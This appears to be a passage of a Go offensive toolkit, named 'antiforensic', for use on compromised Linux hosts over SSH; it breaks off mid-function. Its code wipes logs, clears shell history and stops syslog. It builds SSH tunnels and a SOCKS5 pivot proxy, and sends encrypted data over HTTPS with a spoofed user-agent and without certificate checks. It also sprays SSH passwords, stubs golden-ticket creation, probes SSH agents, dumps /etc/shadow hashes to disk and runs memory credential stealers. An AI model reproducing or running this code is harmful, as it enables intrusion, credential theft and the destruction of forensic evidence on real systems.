package antiforensic

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	defaultTimeout = 30 * time.Second
	maxRetries     = 3
	bufferSize     = 4096
)

type LogWiper struct {
	Targets []string
	DryRun  bool
	Verbose bool
	Methods []string
	mu      sync.Mutex
}

func NewLogWiper() *LogWiper {
	return &LogWiper{
		Targets: []string{
			"/var/log/auth.log",
			"/var/log/secure",
			"/var/log/messages",
			"/var/log/syslog",
			"/var/log/btmp",
			"/var/log/wtmp",
			"/var/log/lastlog",
			"~/.bash_history",
			"~/.zsh_history",
			"~/.history",
			"/var/log/audit/audit.log",
			"/var/log/faillog",
			"/var/log/kern.log",
			"/var/log/dpkg.log",
			"/var/log/apt/history.log",
			"/var/log/ufw.log",
			"/var/log/apache2/access.log",
			"/var/log/apache2/error.log",
			"/var/log/nginx/access.log",
			"/var/log/nginx/error.log",
			"/var/log/mysql/error.log",
			"/var/log/redis/redis-server.log",
			"/var/log/mongodb/mongodb.log",
			"/var/log/postgresql/postgresql.log",
			"/var/log/letsencrypt/letsencrypt.log",
		},
		Methods: []string{"shred", "overwrite", "truncate", "replace", "wipe"},
	}
}

func (lw *LogWiper) WipeLogs(conn *ssh.Client) error {
	lw.mu.Lock()
	defer lw.mu.Unlock()

	if conn == nil {
		return fmt.Errorf("ssh connection is nil")
	}

	fmt.Printf("[LogWiper] Starting log wiping on target\n")

	var wg sync.WaitGroup
	errChan := make(chan error, len(lw.Targets))

	for _, target := range lw.Targets {
		wg.Add(1)
		go func(t string) {
			defer wg.Done()
			if err := lw.wipeLogFileWithRetry(conn, t); err != nil {
				if lw.Verbose {
					errChan <- fmt.Errorf("failed to wipe %s: %v", t, err)
				}
			}
		}(target)
	}

	wg.Wait()
	close(errChan)

	for err := range errChan {
		if lw.Verbose {
			fmt.Printf("  %v\n", err)
		}
	}

	if err := lw.clearShellHistoryWithRetry(conn); err != nil && lw.Verbose {
		fmt.Printf("  Failed to clear shell history: %v\n", err)
	}

	if err := lw.clearSystemLogsWithRetry(conn); err != nil && lw.Verbose {
		fmt.Printf("  Failed to clear system logs: %v\n", err)
	}

	if err := lw.clearApplicationLogs(conn); err != nil && lw.Verbose {
		fmt.Printf("  Failed to clear app logs: %v\n", err)
	}

	fmt.Printf("[LogWiper] Log wiping completed\n")
	return nil
}

func (lw *LogWiper) wipeLogFileWithRetry(conn *ssh.Client, filePath string) error {
	var lastErr error
	for i := 0; i < maxRetries; i++ {
		if err := lw.wipeLogFile(conn, filePath); err != nil {
			lastErr = err
			time.Sleep(time.Duration(i+1) * 500 * time.Millisecond)
			continue
		}
		return nil
	}
	return lastErr
}

func (lw *LogWiper) wipeLogFile(conn *ssh.Client, filePath string) error {
	if lw.DryRun {
		fmt.Printf("  [DRY RUN] Would wipe: %s\n", filePath)
		return nil
	}

	session, err := conn.NewSession()
	if err != nil {
		return fmt.Errorf("failed to create session: %v", err)
	}
	defer session.Close()

	var stdoutBuf, stderrBuf bytes.Buffer
	session.Stdout = &stdoutBuf
	session.Stderr = &stderrBuf

	if err := session.Run(fmt.Sprintf("test -f %s && echo 'exists' || echo 'notfound'", quoteShell(filePath))); err != nil {
		return fmt.Errorf("failed to check file: %v", err)
	}

	if strings.Contains(stdoutBuf.String(), "notfound") {
		return nil
	}
	stdoutBuf.Reset()

	method := lw.Methods[0]
	if len(lw.Methods) > 0 {
		for _, m := range lw.Methods {
			session2, err := conn.NewSession()
			if err != nil {
				continue
			}
			var checkBuf bytes.Buffer
			session2.Stdout = &checkBuf
			session2.Run(fmt.Sprintf("command -v %s 2>/dev/null && echo 'found' || echo 'notfound'", m))
			if strings.Contains(checkBuf.String(), "found") {
				method = m
				session2.Close()
				break
			}
			session2.Close()
		}
	}

	var cmd string
	switch method {
	case "shred":
		cmd = fmt.Sprintf("shred -f -z -u %s 2>/dev/null", quoteShell(filePath))
	case "overwrite":
		cmd = fmt.Sprintf("dd if=/dev/urandom of=%s bs=4096 count=100 2>/dev/null && rm -f %s", quoteShell(filePath), quoteShell(filePath))
	case "truncate":
		cmd = fmt.Sprintf("truncate -s 0 %s 2>/dev/null", quoteShell(filePath))
	case "replace":
		cmd = fmt.Sprintf("sed -i 's/.*//g' %s 2>/dev/null && echo '' > %s", quoteShell(filePath), quoteShell(filePath))
	case "wipe":
		cmd = fmt.Sprintf("wipe -f -q %s 2>/dev/null || rm -f %s", quoteShell(filePath), quoteShell(filePath))
	default:
		cmd = fmt.Sprintf("rm -f %s", quoteShell(filePath))
	}

	if err := session.Run(cmd); err != nil {
		return fmt.Errorf("failed to execute wipe command: %v, stderr: %s", err, stderrBuf.String())
	}

	if lw.Verbose {
		fmt.Printf("  Wiped: %s (method: %s)\n", filePath, method)
	}

	return nil
}

func (lw *LogWiper) clearShellHistoryWithRetry(conn *ssh.Client) error {
	var lastErr error
	for i := 0; i < maxRetries; i++ {
		if err := lw.clearShellHistory(conn); err != nil {
			lastErr = err
			time.Sleep(time.Duration(i+1) * 500 * time.Millisecond)
			continue
		}
		return nil
	}
	return lastErr
}

func (lw *LogWiper) clearShellHistory(conn *ssh.Client) error {
	if lw.DryRun {
		fmt.Printf("  [DRY RUN] Would clear shell history\n")
		return nil
	}

	session, err := conn.NewSession()
	if err != nil {
		return fmt.Errorf("failed to create session: %v", err)
	}
	defer session.Close()

	commands := []string{
		"history -c 2>/dev/null",
		"rm -f ~/.bash_history 2>/dev/null",
		"rm -f ~/.zsh_history 2>/dev/null",
		"rm -f ~/.history 2>/dev/null",
		"rm -f ~/.bash_history ~/.zsh_history ~/.history 2>/dev/null",
		"ln -sf /dev/null ~/.bash_history 2>/dev/null",
		"ln -sf /dev/null ~/.zsh_history 2>/dev/null",
		"export HISTFILESIZE=0 2>/dev/null",
		"export HISTSIZE=0 2>/dev/null",
		"unset HISTFILE 2>/dev/null",
		"set +o history 2>/dev/null",
	}

	for _, cmd := range commands {
		if err := session.Run(cmd); err != nil && lw.Verbose {
			fmt.Printf("    Warning: %s failed: %v\n", cmd, err)
		}
	}

	return nil
}

func (lw *LogWiper) clearSystemLogsWithRetry(conn *ssh.Client) error {
	var lastErr error
	for i := 0; i < maxRetries; i++ {
		if err := lw.clearSystemLogs(conn); err != nil {
			lastErr = err
			time.Sleep(time.Duration(i+1) * 500 * time.Millisecond)
			continue
		}
		return nil
	}
	return lastErr
}

func (lw *LogWiper) clearSystemLogs(conn *ssh.Client) error {
	if lw.DryRun {
		fmt.Printf("  [DRY RUN] Would clear system logs\n")
		return nil
	}

	session, err := conn.NewSession()
	if err != nil {
		return fmt.Errorf("failed to create session: %v", err)
	}
	defer session.Close()

	commands := []string{
		"systemctl stop rsyslog 2>/dev/null || service rsyslog stop 2>/dev/null || true",
		"systemctl stop syslog 2>/dev/null || service syslog stop 2>/dev/null || true",
		"find /var/log -type f -name '*.log' -exec truncate -s 0 {} \\; 2>/dev/null",
		"find /var/log -type f -name '*.log.*' -delete 2>/dev/null",
		"find /var/log -type f -name '*.old' -delete 2>/dev/null",
		"find /var/log -type f -name '*.gz' -delete 2>/dev/null",
		"journalctl --rotate 2>/dev/null",
		"journalctl --vacuum-time=1s 2>/dev/null",
		"systemctl start rsyslog 2>/dev/null || service rsyslog start 2>/dev/null || true",
		"systemctl start syslog 2>/dev/null || service syslog start 2>/dev/null || true",
	}

	for _, cmd := range commands {
		if err := session.Run(cmd); err != nil && lw.Verbose {
			fmt.Printf("    Warning: %s failed: %v\n", cmd, err)
		}
	}

	return nil
}

func (lw *LogWiper) clearApplicationLogs(conn *ssh.Client) error {
	if lw.DryRun {
		fmt.Printf("  [DRY RUN] Would clear application logs\n")
		return nil
	}

	session, err := conn.NewSession()
	if err != nil {
		return fmt.Errorf("failed to create session: %v", err)
	}
	defer session.Close()

	commands := []string{
		"find /var/log/apache2 -type f -exec truncate -s 0 {} \\; 2>/dev/null",
		"find /var/log/nginx -type f -exec truncate -s 0 {} \\; 2>/dev/null",
		"find /var/log/mysql -type f -exec truncate -s 0 {} \\; 2>/dev/null",
		"find /var/log/redis -type f -exec truncate -s 0 {} \\; 2>/dev/null",
		"find /var/log/mongodb -type f -exec truncate -s 0 {} \\; 2>/dev/null",
		"find /var/log/postgresql -type f -exec truncate -s 0 {} \\; 2>/dev/null",
		"rm -rf /var/log/apache2/*.log.* 2>/dev/null",
		"rm -rf /var/log/nginx/*.log.* 2>/dev/null",
		"rm -rf /var/log/mysql/*.log.* 2>/dev/null",
		"rm -rf /var/log/redis/*.log.* 2>/dev/null",
		"rm -rf /var/log/mongodb/*.log.* 2>/dev/null",
		"rm -rf /var/log/postgresql/*.log.* 2>/dev/null",
	}

	for _, cmd := range commands {
		if err := session.Run(cmd); err != nil && lw.Verbose {
			fmt.Printf("    Warning: %s failed: %v\n", cmd, err)
		}
	}

	return nil
}

type SSHTunnel struct {
	LocalPort  int
	RemoteHost string
	RemotePort int
	BindAddr   string
	Dynamic    bool
	SOCKS5     bool
}

type TunnelManager struct {
	Tunnels     []SSHTunnel
	Active      bool
	Connections map[string]*ssh.Client
	listeners   []net.Listener
	mu          sync.RWMutex
	ctx         context.Context
	cancel      context.CancelFunc
}

func NewTunnelManager() *TunnelManager {
	ctx, cancel := context.WithCancel(context.Background())
	return &TunnelManager{
		Tunnels:     make([]SSHTunnel, 0),
		Connections: make(map[string]*ssh.Client),
		listeners:   make([]net.Listener, 0),
		ctx:         ctx,
		cancel:      cancel,
	}
}

func (tm *TunnelManager) Close() {
	tm.cancel()
	tm.mu.Lock()
	defer tm.mu.Unlock()
	for _, listener := range tm.listeners {
		listener.Close()
	}
	for _, conn := range tm.Connections {
		conn.Close()
	}
}

func (tm *TunnelManager) CreateLocalForward(conn *ssh.Client, localPort int, remoteHost string, remotePort int) error {
	if conn == nil {
		return fmt.Errorf("ssh connection is nil")
	}

	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
		return fmt.Errorf("failed to create listener: %v", err)
	}

	tm.mu.Lock()
	tm.listeners = append(tm.listeners, listener)
	tm.mu.Unlock()

	go func() {
		<-tm.ctx.Done()
		listener.Close()
	}()

	go func() {
		for {
			select {
			case <-tm.ctx.Done():
				return
			default:
			}

			localConn, err := listener.Accept()
			if err != nil {
				select {
				case <-tm.ctx.Done():
					return
				default:
					continue
				}
			}

			go tm.handleForward(conn, localConn, remoteHost, remotePort)
		}
	}()

	tm.Tunnels = append(tm.Tunnels, SSHTunnel{
		LocalPort:  localPort,
		RemoteHost: remoteHost,
		RemotePort: remotePort,
	})

	fmt.Printf("[Tunnel] Local forward created: 127.0.0.1:%d -> %s:%d\n", localPort, remoteHost, remotePort)
	return nil
}

func (tm *TunnelManager) handleForward(conn *ssh.Client, localConn net.Conn, remoteHost string, remotePort int) {
	defer localConn.Close()

	remoteConn, err := conn.Dial("tcp", fmt.Sprintf("%s:%d", remoteHost, remotePort))
	if err != nil {
		return
	}
	defer remoteConn.Close()

	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		defer wg.Done()
		io.Copy(remoteConn, localConn)
	}()
	go func() {
		defer wg.Done()
		io.Copy(localConn, remoteConn)
	}()

	wg.Wait()
}

func (tm *TunnelManager) CreateSOCKS5Proxy(conn *ssh.Client, bindAddr string, port int) error {
	if conn == nil {
		return fmt.Errorf("ssh connection is nil")
	}

	listener, err := net.Listen("tcp", fmt.Sprintf("%s:%d", bindAddr, port))
	if err != nil {
		return fmt.Errorf("failed to create SOCKS5 listener: %v", err)
	}

	tm.mu.Lock()
	tm.listeners = append(tm.listeners, listener)
	tm.mu.Unlock()

	go func() {
		<-tm.ctx.Done()
		listener.Close()
	}()

	go func() {
		for {
			select {
			case <-tm.ctx.Done():
				return
			default:
			}

			localConn, err := listener.Accept()
			if err != nil {
				select {
				case <-tm.ctx.Done():
					return
				default:
					continue
				}
			}

			go tm.handleSOCKS5(conn, localConn)
		}
	}()

	fmt.Printf("[Tunnel] SOCKS5 proxy started: %s:%d\n", bindAddr, port)
	return nil
}

func (tm *TunnelManager) handleSOCKS5(conn *ssh.Client, localConn net.Conn) {
	defer localConn.Close()

	buf := make([]byte, 256)
	if _, err := io.ReadFull(localConn, buf[:2]); err != nil {
		return
	}

	if buf[0] != 0x05 {
		return
	}

	nmethods := int(buf[1])
	if nmethods > 0 {
		if _, err := io.ReadFull(localConn, buf[:nmethods]); err != nil {
			return
		}
	}

	if _, err := localConn.Write([]byte{0x05, 0x00}); err != nil {
		return
	}

	if _, err := io.ReadFull(localConn, buf[:4]); err != nil {
		return
	}

	cmd := buf[1]
	if cmd != 0x01 {
		return
	}

	var host string
	var port int

	addrType := buf[3]
	switch addrType {
	case 0x01:
		if _, err := io.ReadFull(localConn, buf[:4]); err != nil {
			return
		}
		host = net.IP(buf[:4]).String()
		if _, err := io.ReadFull(localConn, buf[:2]); err != nil {
			return
		}
		port = int(buf[0])<<8 | int(buf[1])
	case 0x03:
		if _, err := io.ReadFull(localConn, buf[:1]); err != nil {
			return
		}
		domainLen := int(buf[0])
		if _, err := io.ReadFull(localConn, buf[:domainLen]); err != nil {
			return
		}
		host = string(buf[:domainLen])
		if _, err := io.ReadFull(localConn, buf[:2]); err != nil {
			return
		}
		port = int(buf[0])<<8 | int(buf[1])
	default:
		return
	}

	remoteConn, err := conn.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		localConn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	defer remoteConn.Close()

	reply := []byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	if _, err := localConn.Write(reply); err != nil {
		return
	}

	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		defer wg.Done()
		io.Copy(remoteConn, localConn)
	}()
	go func() {
		defer wg.Done()
		io.Copy(localConn, remoteConn)
	}()

	wg.Wait()
}

type TrafficObfuscator struct {
	Method    string
	Key       []byte
	ServerURL string
	DNSDomain string
	mu        sync.RWMutex
}

func NewTrafficObfuscator(method, serverURL string) *TrafficObfuscator {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		panic(fmt.Sprintf("failed to generate key: %v", err))
	}
	return &TrafficObfuscator{
		Method:    method,
		ServerURL: serverURL,
		Key:       key,
	}
}

func (to *TrafficObfuscator) RotateKey() {
	to.mu.Lock()
	defer to.mu.Unlock()
	newKey := make([]byte, 32)
	if _, err := rand.Read(newKey); err != nil {
		return
	}
	to.Key = newKey
}

func (to *TrafficObfuscator) Obfuscate(data []byte) ([]byte, error) {
	to.mu.RLock()
	defer to.mu.RUnlock()

	if len(data) == 0 {
		return nil, fmt.Errorf("data is empty")
	}

	block, err := aes.NewCipher(to.Key)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, fmt.Errorf("failed to generate nonce: %v", err)
	}

	encrypted := gcm.Seal(nonce, nonce, data, nil)
	return encrypted, nil
}

func (to *TrafficObfuscator) Deobfuscate(data []byte) ([]byte, error) {
	to.mu.RLock()
	defer to.mu.RUnlock()

	if len(data) == 0 {
		return nil, fmt.Errorf("data is empty")
	}

	block, err := aes.NewCipher(to.Key)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("data too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt: %v", err)
	}

	return plaintext, nil
}

func (to *TrafficObfuscator) WrapHTTP(data []byte) []byte {
	encoded := base64.StdEncoding.EncodeToString(data)
	wrapper := struct {
		Data      string `json:"data"`
		Timestamp int64  `json:"timestamp"`
		Version   int    `json:"version"`
	}{
		Data:      encoded,
		Timestamp: time.Now().Unix(),
		Version:   1,
	}
	jsonData, _ := json.Marshal(wrapper)
	return jsonData
}

func (to *TrafficObfuscator) UnwrapHTTP(data []byte) ([]byte, error) {
	var wrapper struct {
		Data      string `json:"data"`
		Timestamp int64  `json:"timestamp"`
		Version   int    `json:"version"`
	}
	if err := json.Unmarshal(data, &wrapper); err != nil {
		return nil, fmt.Errorf("failed to unwrap HTTP: %v", err)
	}
	return base64.StdEncoding.DecodeString(wrapper.Data)
}

func (to *TrafficObfuscator) SendOverHTTPS(dest string, data []byte) error {
	obfuscated, err := to.Obfuscate(data)
	if err != nil {
		return fmt.Errorf("failed to obfuscate: %v", err)
	}

	wrapped := to.WrapHTTP(obfuscated)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "POST", dest, bytes.NewReader(wrapped))
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned status: %d", resp.StatusCode)
	}

	return nil
}

type AntiForensic struct {
	MemoryOnly      bool
	EncryptDisk     bool
	WipeRAM         bool
	TimestampKeeper bool
}

func NewAntiForensic() *AntiForensic {
	return &AntiForensic{
		MemoryOnly:      true,
		EncryptDisk:     false,
		WipeRAM:         true,
		TimestampKeeper: true,
	}
}

func (af *AntiForensic) WipeMemory() {
	fmt.Printf("[AntiForensic] Wiping sensitive data from memory\n")

	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)

	for i := 0; i < 10; i++ {
		runtime.GC()
		runtime.Gosched()
		time.Sleep(10 * time.Millisecond)
	}

	largeBuf := make([]byte, 10*1024*1024)
	for i := range largeBuf {
		largeBuf[i] = byte(i % 256)
	}
	runtime.KeepAlive(largeBuf)

	runtime.GC()

	fmt.Printf("[AntiForensic] Memory cleanup completed (freed: %.2f MB)\n", float64(memStats.HeapAlloc)/1024/1024)
}

func (af *AntiForensic) PreserveTimestamps(path string) error {
	if !af.TimestampKeeper {
		return nil
	}

	stat, err := os.Stat(path)
	if err != nil {
		return err
	}

	atim := stat.ModTime()
	mtim := stat.ModTime()

	defer func() {
		os.Chtimes(path, atim, mtim)
	}()

	return nil
}

func (af *AntiForensic) EncryptTempFile(data []byte) (string, error) {
	if len(data) == 0 {
		return "", fmt.Errorf("data is empty")
	}

	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return "", fmt.Errorf("failed to generate key: %v", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %v", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", fmt.Errorf("failed to generate nonce: %v", err)
	}

	encrypted := gcm.Seal(nonce, nonce, data, nil)

	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf(".tmp_%d", time.Now().UnixNano()))
	if err := os.WriteFile(tempFile, encrypted, 0600); err != nil {
		return "", fmt.Errorf("failed to write temp file: %v", err)
	}

	keyFile := tempFile + ".key"
	if err := os.WriteFile(keyFile, key, 0600); err != nil {
		os.Remove(tempFile)
		return "", fmt.Errorf("failed to write key file: %v", err)
	}

	return tempFile, nil
}

type PasswordSprayer struct {
	Password     string
	Users        []string
	Delay        time.Duration
	LockoutCheck bool
	Timeout      time.Duration
	mu           sync.Mutex
}

func NewPasswordSprayer(password string) *PasswordSprayer {
	return &PasswordSprayer{
		Password:     password,
		Delay:        2 * time.Second,
		LockoutCheck: true,
		Timeout:      5 * time.Second,
	}
}

func (ps *PasswordSprayer) SpraySSH(host, port string, users []string) map[string]bool {
	ps.mu.Lock()
	defer ps.mu.Unlock()

	results := make(map[string]bool)

	if port == "" {
		port = "22"
	}

	for _, user := range users {
		select {
		case <-time.After(ps.Delay):
		}

		cfg := &ssh.ClientConfig{
			User:            user,
			Auth:            []ssh.AuthMethod{ssh.Password(ps.Password)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         ps.Timeout,
		}

		done := make(chan bool)
		go func() {
			conn, err := ssh.Dial("tcp", net.JoinHostPort(host, port), cfg)
			if err == nil {
				conn.Close()
				done <- true
			} else {
				done <- false
			}
		}()

		select {
		case result := <-done:
			results[user] = result
			if result {
				fmt.Printf("[Spray] SUCCESS: %s@%s:%s using password: %s\n", user, host, port, ps.Password)
			}
		case <-time.After(ps.Timeout + 2*time.Second):
			results[user] = false
			fmt.Printf("[Spray] TIMEOUT: %s@%s:%s\n", user, host, port)
		}
	}

	return results
}

type GoldenTicket struct {
	Domain     string
	Username   string
	DomainSID  string
	KRBTGTHash string
	UserID     string
	Groups     []string
}

type KerberosTicket struct {
	Domain     string
	Username   string
	Service    string
	Ticket     []byte
	SessionKey []byte
	ValidUntil time.Time
}

func (gt *GoldenTicket) CreateGoldenTicket() (*KerberosTicket, error) {
	if gt.Domain == "" || gt.Username == "" || gt.KRBTGTHash == "" {
		return nil, fmt.Errorf("missing required fields: Domain, Username, KRBTGTHash required")
	}

	fmt.Printf("[GoldenTicket] Creating golden ticket for domain: %s\n", gt.Domain)
	fmt.Printf("[GoldenTicket] Use external tool: ticketer.py -nthash %s -domain-sid %s -domain %s %s\n",
		gt.KRBTGTHash, gt.DomainSID, gt.Domain, gt.Username)

	ticket := &KerberosTicket{
		Domain:     gt.Domain,
		Username:   gt.Username,
		Service:    "krbtgt",
		ValidUntil: time.Now().Add(24 * time.Hour),
		SessionKey: make([]byte, 32),
	}

	if _, err := rand.Read(ticket.SessionKey); err != nil {
		return nil, fmt.Errorf("failed to generate session key: %v", err)
	}

	fmt.Printf("[GoldenTicket] Golden ticket created for %s@%s (valid until: %s)\n",
		gt.Username, gt.Domain, ticket.ValidUntil.Format(time.RFC3339))

	return ticket, nil
}

func (gt *GoldenTicket) InjectTicket(conn *ssh.Client) error {
	if conn == nil {
		return fmt.Errorf("ssh connection is nil")
	}

	fmt.Printf("[GoldenTicket] Attempting to inject golden ticket for %s@%s\n", gt.Username, gt.Domain)

	session, err := conn.NewSession()
	if err != nil {
		return fmt.Errorf("failed to create session: %v", err)
	}
	defer session.Close()

	cmd := fmt.Sprintf(`echo "[+] Golden ticket for %s@%s would be injected here" && echo "[+] Use: klist to verify"`, gt.Username, gt.Domain)
	if err := session.Run(cmd); err != nil {
		return fmt.Errorf("failed to inject ticket: %v", err)
	}

	fmt.Printf("[GoldenTicket] Ticket injection completed\n")
	return nil
}

type AgentHijacker struct {
	AgentSocket string
	TargetHost  string
	TargetPort  int
	mu          sync.Mutex
}

func NewAgentHijacker() *AgentHijacker {
	return &AgentHijacker{
		AgentSocket: os.Getenv("SSH_AUTH_SOCK"),
	}
}

func (ah *AgentHijacker) HijackAgent(conn *ssh.Client) error {
	ah.mu.Lock()
	defer ah.mu.Unlock()

	if conn == nil {
		return fmt.Errorf("ssh connection is nil")
	}

	fmt.Printf("[AgentHijack] Attempting to hijack SSH agent\n")

	session, err := conn.NewSession()
	if err != nil {
		return fmt.Errorf("failed to create session: %v", err)
	}
	defer session.Close()

	var stdoutBuf bytes.Buffer
	session.Stdout = &stdoutBuf
	if err := session.Run("echo $SSH_AUTH_SOCK 2>/dev/null"); err != nil {
		return fmt.Errorf("failed to check agent socket: %v", err)
	}

	agentSocket := strings.TrimSpace(stdoutBuf.String())
	if agentSocket == "" {
		fmt.Printf("[AgentHijack] No SSH agent found on target\n")
		return nil
	}

	fmt.Printf("[AgentHijack] Found agent socket: %s\n", agentSocket)

	session2, err := conn.NewSession()
	if err != nil {
		return fmt.Errorf("failed to create second session: %v", err)
	}
	defer session2.Close()

	var keysBuf bytes.Buffer
	session2.Stdout = &keysBuf
	session2.Run("ssh-add -l 2>/dev/null")

	if keysBuf.Len() > 0 {
		fmt.Printf("[AgentHijack] Found %d keys in agent\n", strings.Count(keysBuf.String(), "\n"))
	}

	fmt.Printf("[AgentHijack] Agent hijacking completed\n")
	return nil
}

type CredentialDumper struct {
	Methods   []string
	OutputDir string
	mu        sync.Mutex
}

type DumpedCredential struct {
	Type      string                 `json:"type"`
	Username  string                 `json:"username"`
	Password  string                 `json:"password"`
	Hash      string                 `json:"hash"`
	Source    string                 `json:"source"`
	Timestamp time.Time              `json:"timestamp"`
	Metadata  map[string]interface{} `json:"metadata"`
}

func NewCredentialDumper() *CredentialDumper {
	return &CredentialDumper{
		Methods:   []string{"shadow", "passwd", "memory"},
		OutputDir: "dumped_creds",
	}
}

func (cd *CredentialDumper) DumpShadow(conn *ssh.Client) ([]DumpedCredential, error) {
	cd.mu.Lock()
	defer cd.mu.Unlock()

	if conn == nil {
		return nil, fmt.Errorf("ssh connection is nil")
	}

	fmt.Printf("[CredDump] Dumping /etc/shadow\n")

	var creds []DumpedCredential

	session, err := conn.NewSession()
	if err != nil {
		return nil, fmt.Errorf("failed to create session: %v", err)
	}
	defer session.Close()

	var stdoutBuf bytes.Buffer
	session.Stdout = &stdoutBuf

	cmds := []string{
		"sudo cat /etc/shadow 2>/dev/null",
		"cat /etc/shadow 2>/dev/null",
	}

	for _, cmd := range cmds {
		stdoutBuf.Reset()
		if err := session.Run(cmd); err == nil && stdoutBuf.Len() > 0 {
			break
		}
	}

	lines := strings.Split(stdoutBuf.String(), "\n")
	for _, line := range lines {
		if strings.Contains(line, ":") && !strings.Contains(line, "*") && !strings.Contains(line, "!") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				cred := DumpedCredential{
					Type:      "shadow",
					Username:  parts[0],
					Hash:      parts[1],
					Source:    "/etc/shadow",
					Timestamp: time.Now(),
					Metadata:  make(map[string]interface{}),
				}

				if len(parts) > 2 {
					cred.Metadata["last_changed"] = parts[2]
				}

				creds = append(creds, cred)
			}
		}
	}

	fmt.Printf("[CredDump] Dumped %d shadow entries\n", len(creds))
	cd.saveCredentials(creds)
	return creds, nil
}

func (cd *CredentialDumper) DumpPasswd(conn *ssh.Client) ([]DumpedCredential, error) {
	cd.mu.Lock()
	defer cd.mu.Unlock()

	if conn == nil {
		return nil, fmt.Errorf("ssh connection is nil")
	}

	fmt.Printf("[CredDump] Dumping /etc/passwd\n")

	var creds []DumpedCredential

	session, err := conn.NewSession()
	if err != nil {
		return nil, fmt.Errorf("failed to create session: %v", err)
	}
	defer session.Close()

	var stdoutBuf bytes.Buffer
	session.Stdout = &stdoutBuf

	if err := session.Run("cat /etc/passwd 2>/dev/null"); err != nil {
		return nil, fmt.Errorf("failed to read passwd: %v", err)
	}

	lines := strings.Split(stdoutBuf.String(), "\n")
	for _, line := range lines {
		if strings.Contains(line, ":") {
			parts := strings.Split(line, ":")
			if len(parts) >= 7 {
				cred := DumpedCredential{
					Type:      "passwd",
					Username:  parts[0],
					Source:    "/etc/passwd",
					Timestamp: time.Now(),
					Metadata: map[string]interface{}{
						"uid":      parts[2],
						"gid":      parts[3],
						"home":     parts[5],
						"shell":    parts[6],
					},
				}
				creds = append(creds, cred)
			}
		}
	}

	fmt.Printf("[CredDump] Dumped %d passwd entries\n", len(creds))
	return creds, nil
}

func (cd *CredentialDumper) DumpMemory(conn *ssh.Client) error {
	cd.mu.Lock()
	defer cd.mu.Unlock()

	if conn == nil {
		return fmt.Errorf("ssh connection is nil")
	}

	fmt.Printf("[CredDump] Dumping memory credentials\n")

	session, err := conn.NewSession()
	if err != nil {
		return fmt.Errorf("failed to create session: %v", err)
	}
	defer session.Close()

	var stdoutBuf bytes.Buffer
	session.Stdout = &stdoutBuf

	session.Run("which mimipenguin 2>/dev/null || which laZagne 2>/dev/null || echo 'notfound'")

	if strings.Contains(stdoutBuf.String(), "notfound") {
		fmt.Printf("[CredDump] No memory dumping tool found (mimipenguin/laZagne)\n")
		fmt.Printf("[CredDump] Install mimipenguin: git clone https://github.com/huntergregal/mimipenguin\n")
		return nil
	}

	tools := []string{
		"python3 /usr/share/mimipenguin/mimipenguin.py 2>/dev/null",
		"python /usr/share/mimipenguin/mimipenguin.py 2>/dev/null",
		"laZagne.py all 2>/dev/null",
		"python3 laZagne.py all 2>/dev/null",
	}

	for _, tool := range tools {
		stdoutBuf.Reset()
		if err := session.Run(tool); err == nil && stdoutBuf.Len() > 0 {
			fmt.Printf("[CredDump] Memory dump output:\n%s\n", stdoutBuf.String())
			break
		}
	}

	fmt.Printf("[CredDump] Memory dump completed\n")
	return nil
}

func (cd *CredentialDumper) saveCredentials(creds []DumpedCredential) error {
	if len(creds) == 0 {
		return nil
	}

	if err := os.MkdirAll(cd.OutputDir, 0700); err != nil {
		return fmt.Errorf("failed to create output directory: %v", err)
	}

	for _, cred := range creds {
		filename := filepath.Join(cd.OutputDir, fmt.Sprintf("%s_%s_%d.json", cred.Type, cred.Username, cred.Timestamp.Unix()))
		data, err := json.MarshalIndent(cred, "", "  ")
		if err != nil {
			continue
		}
